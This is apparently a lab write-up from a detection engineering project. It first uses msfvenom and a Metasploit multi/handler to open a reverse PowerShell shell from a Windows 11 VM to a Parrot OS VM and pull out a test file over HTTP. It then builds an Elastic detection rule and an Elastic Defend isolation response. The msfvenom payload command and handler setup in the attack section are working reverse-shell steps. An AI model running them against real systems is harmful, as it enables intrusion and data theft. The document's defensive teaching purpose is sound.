# Metasploit Reverse Shell

<br />

<p align="center">
<img src="https://images.crunchbase.com/image/upload/c_pad,f_auto,q_auto:eco,dpr_1/v1469039917/hodwdopd059vkn2k1b5a.png" height="30%" width="30%" alt="Detection Engineering Logo Team Ghost"/>
</p>


<h2>Description</h2>

In this section of the project we are going to be using Metasploit to spawn a reverse shell into our Windows 11 VM and exfiltrate some data. A reverse shell is a type of remote shell where the target machine initiates a connection to the attacker's machine, providing the attacker with control over the target.

</br>

<h2>Reverse Shell Attack</h2>

<h3>Attack Setup</h3>

The first thing we need to do to set up this attack is to open an http server on our Parrot OS VM. To do this open up a terminal and enter in this command:

```Bash

python -m http.server 8000

```

<p align="center">
<img src="https://i.imgur.com/fcGQLBq.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Next we are going to create a shell.bat file with code that will allow us to spawn a reverse shell. First, make sure that you are in the Desktop directory in your terminal then execute this command:

```Bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.0.0.5 lport=4689 > shell.bat
```

This command creates a reverse shell payload for Windows that uses PowerShell to connect back to our Parrot OS VM at IP address 10.0.0.5 on port 4689. The payload is saved as a batch file (shell.bat), which, when executed on our Windows 11 VM machine, will establish a reverse shell connection, giving us remote control over the Windows 11 VM.

<p align="center">
<img src="https://i.imgur.com/cSCiapf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Afterwards we need to set up the multi-handler to listen for our payload to spawn the reverse shell. To do this enter in this series of commands:

```Bash
sudo msfconsole
use exploit/multi/handler
set lhost 10.0.0.5
set lport 4689
```

<p align="center">
<img src="https://i.imgur.com/GNc4zvq.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, download the Valuable Company Data - DO NOT HAXXX.txt from this page and set it inside the "Documents" Folder of your Windows VM. This is the data we are going to exfiltrate with out reverse shell.

<p align="center">
<img src="https://i.imgur.com/aPdXRkk.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

We are now ready to execute the attack.

</br>

<h3>Attack Execution</h3>

To launch this attack we are going to execute a .bat script that I have provided named "Reverse Shell.bat" on our Windows 11 VM. First, on our Parrot OS VM inside the Metasploit console enter the command "run" to have the multi-handler start listening for the payload. Next, on our Windows 11 VM execute the .bat file and wait until the reverse shell has spawned. Now that we have a reverse shell we are going to navigate to the directory containing our txt file.

<p align="center">
<img src="https://i.imgur.com/dlMLo38.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally we are going to exfiltrate the txt file by creating an http server via python. Afterwards, connect to the http server with a browser and download the file.

<p align="center">
<img src="https://i.imgur.com/3O8EvvB.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<h2>Reverse Shell Detection & Response</h2>


<h3>Reverse Shell Query</h3>

The approach that we are going to take to create this query is that we are going to use the shell script to our advantage and build are query based on that. If you go into the logs in elastic and find the powershell script that was executed this is what you'll find.

<p align="center">
<img src="https://i.imgur.com/d41awrK.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

The query that we are going to use for our detection rule is "data_stream.dataset : "windows.sysmon_operational" and process.args : ("powershell" and "w" and "hidden" and "-nop")

-  data_stream.dataset : "windows.sysmon_operational" looks for logs that contains this dataset
-  process.args : ("powershell" and "w" and "hidden" and "-nop") looks for logs that contains these process arguments which are the first process arguments of reverse shell script

<p align="center">
<img src="https://i.imgur.com/J2807n5.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>


<h3>Elastic Defend Installation</h3>

In Elastic we can use an integration called "Elastic Defend" to set up a response action whenever an alert triggers. In this project we are going to set up Elastic Defender so that it isolates our Windows VM when Elastic detects this reverse shell.

First, we need to install the Elastic Defend integration. To do this head into your Elastic Environment and go to the search box that is located on the top of the page. Search for "Elastic Defender" and select that option. Next, click on the blue "Add Elastic Defend" button.

<p align="center">
<img src="https://i.imgur.com/cdFroIE.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Afterwards, configure the integration settings by adding A name and description, selecting "Complete EDR (Endpoint Detection & Response), and adding the integration to our existing Windows Agent. Once, that is done proceed to install the integration.

<p align="center">
<img src="https://i.imgur.com/iI46FTK.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/sWbGFI3.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/NY9FmMd.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, verify that the Windows VM has Elastic Defender by heading to "Security" in your Elastic environment and selecting the "Manage" option. Next, click on "Endpoints" and you should be taken to a page that lists your Windows VM.

<p align="center">
<img src="https://i.imgur.com/CDOobFd.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/qic8PnF.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now, when we create our Rule we will add Elastic Defender as a rule action.

</br>


<h3>Reverse Shell Detection Rule</h3>


<b>Define Rule:</b>

Now that we have our query and Elastic Defender we are now going to create our detection rule. To do this copy the query and click on the hamburger icon on the top-left corner of the page. Scroll down to "Security" and select the "Rules" option. Afterwards click on "Detection Rules (SIEM)" and then select "Create New Rule". Make sure that the "Custom Query" option is selected then scroll down and paste our query. Next scroll down to the "Suppress alerts by" option and enter in "host.name". Then select "Per time period" and select 5 minutes. What this will do is reduce the noise generated by repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://i.imgur.com/uLeJvqo.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/1BPXxte.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>

</p>

<b>About Rule:</b>

Next we are going to fill out the About Rule section. We are going to name the alert "Reverse Shell Detected - Machine Quarantined" and enter in a description for the rule. Set the "Default severity" to "High" then click on "Advance Settings". Scroll down to until you see "MITRE ATT&CK threats" and select the option for "Command & Control" for the technique 

<p align="center">
<img src="https://i.imgur.com/P1JFirJ.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/l5MWf6s.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

Afterward, we will set the duration for how long the rule should run. We will set the rule to run every 5 minutes with a look-back time of 5 minutes. You can adjust this however you'd like.

<p align="center">
<img src="https://i.imgur.com/pdRFGaf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, we can set what action Elastic should take when this rule triggers. For this section of the project we are going to set Elastic Defender as the "Response Action". To do this simply select the "Elastic Defend" option and set the response action to "isolate". You can add a comment in there if you wish. Finally, select "Create & Enable Rule"

<p align="center">
<img src="https://i.imgur.com/qRRvyuB.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we have set our rule we can try to spawn another reverse shell and trigger the alert. We can view the alert by going to "Security" and selecting the "Alerts" option. This is what the alert should look like when it triggers.

<p align="center">
<img src="https://i.imgur.com/SzB7Tcr.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

After Elastic triggers the alert Elastic Defend will isolate our Windows VM from our network. This is what it would look like when this action is performed.

<p align="center">
<img src="https://i.imgur.com/hfsLhi0.gif" height="150%" width="150%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<b>Metasploit Reverse Shell & Elastic Defend Complete!</b>

